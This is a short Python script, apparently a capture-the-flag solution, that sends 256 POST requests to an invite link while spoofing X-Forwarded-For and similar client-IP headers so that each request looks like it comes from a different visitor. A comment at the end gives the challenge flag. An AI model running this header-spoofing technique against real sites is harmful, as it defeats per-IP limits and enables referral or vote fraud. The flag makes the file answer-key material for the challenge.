import requests
import time
register_url = "http://202.38.93.111:10888/invite/01e5017e-d411-42f8-97ca-cd63ce1d82c9"


for k in range(0,256):
    head = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Connection': 'keep-alive',
        'Host': '202.38.93.111:10888',
        'Cookie': 'PHPSESSID=3685733595fe733f1ae89782e42c7270',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'X-Client-IP':'1.1.1.1',
        'X-Remote-IP':'2.2.2.2',
        'X-Remote-Addr':'3.3.3.3',
        'X-Originating-IP':'4.4.4.4',
        'X-Forwarded-For':f'{k}.1.1.1',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '14'
    }
    register_data = {
        'ip': f"{k}.1.1.1"
        }
    r = requests.post(url=register_url,data=register_data,headers=head)
    print(r.text)
    time.sleep(2)
#flag{r3d-enve10p3-8ff2d4c6a5}
